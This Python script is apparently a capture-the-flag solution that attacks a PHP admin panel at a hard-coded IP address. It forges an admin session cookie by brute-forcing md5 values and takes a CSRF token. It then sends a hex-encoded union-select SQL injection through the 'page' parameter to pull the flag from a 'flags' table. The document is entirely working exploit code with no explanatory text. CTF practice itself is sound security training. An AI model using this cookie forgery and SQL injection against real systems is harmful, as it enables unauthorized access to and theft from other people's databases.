import requests
import itertools
import hashlib
import string
import random
import re

URL = "http://106.39.10.134:10002/index.php?action=admin&mode="


class Problem:

    def __init__(self):
        self.rand = "wh"
        self.url = URL + "index"
        self.csrf = URL + 'login'
        self.setpagenum = URL + 'setpagenum'

    def run(self):
        box = self.calculate_products()
        s = self._test(box)
        self.getFlag(s)
        # return c

    def rand_str(self, length):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

    def calculate_products(self):
        _box = itertools.product("wh", repeat=6)
        box = []
        for i in _box:
            result = ""
            for j in i:
                result += j
            box.append(result)
        # print (box)
        return box

    def PHPSESSID(self):
        return "PHPSESSID=vvv"

    def md5_encode(self, data):
        hash = hashlib.md5()
        mystr = (data + "admin").encode()
        hash.update(mystr)
        return hash.hexdigest()

    def _test(self, box):
        s = requests.Session()
        SESSID = self.PHPSESSID()
        s.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
            'cookie': ''
        }
        s.get(self.csrf)
        for i in box:
            s.headers["cookie"] = "uid=admin%7C" + \
                self.md5_encode(i) + ";" + SESSID
            result = s.get(self.url)
            if result.text.find("not login") < 0:
                return s
            continue

    def token(self, s):
        res = s.get(self.setpagenum)
        if res.status_code == 200:
            html = res.content.decode("utf-8")
            m = re.findall(r'name="TOKEN" id="TOKEN" value="(.*?)"', html)
            if m:
                return m[0]
        return False

    def getFlag(self, s):
        data = {
            "page": "0x3120756e696f6e2073656c65637420312c666c61672c312c312066726f6d20666c616773",
            "TOKEN": self.token(s)
        }
        res = s.post(self.setpagenum, data=data)
        res = s.get(self.url)
        if res.status_code == 200:
            m = re.findall(
                r'<td>(whaleCTF{.*?})</td>', res.content.decode("utf-8"))
            print(m[0])


if __name__ == '__main__':
    Problem().run()
